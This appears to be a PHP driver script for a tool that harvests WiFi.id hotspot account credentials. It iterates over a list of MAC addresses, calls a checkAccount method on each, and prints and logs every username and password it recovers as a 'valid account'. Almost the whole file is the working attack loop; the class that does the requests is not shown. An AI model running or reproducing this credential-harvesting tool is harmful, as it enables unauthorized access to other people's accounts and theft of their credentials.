<?php
require_once "src/WiFiID.class.php";
use \dwisiswant0\WiFiID As WiFiID;

$WiFiID = new WiFiID\main();
$mac_list = $WiFiID->getMacList();
$total_mac = count($mac_list);
echo "Found " . $total_mac . " mac addresses!\n";
$live=0;
for ($i=0; $i < $total_mac; $i++) {
	echo "[" . ($i+1) .  "/" . $total_mac . "] Check for " . $mac_list[$i];
	$check = $WiFiID->checkAccount($mac_list[$i]);
	if ($check['status'] === true) {
		$account = $check['account']['username'] . "|" . $check['account']['password'];
		echo " > " . $account;
		$WiFiID->saveAccount($mac_list[$i] . "|" . $account);
		$live++;
	}
	echo "\n";
}
echo "\n";
echo $live . " valid accounts of " . $total_mac . ".\n";
echo "Saved to " . $WiFiID->LOG . "\n";
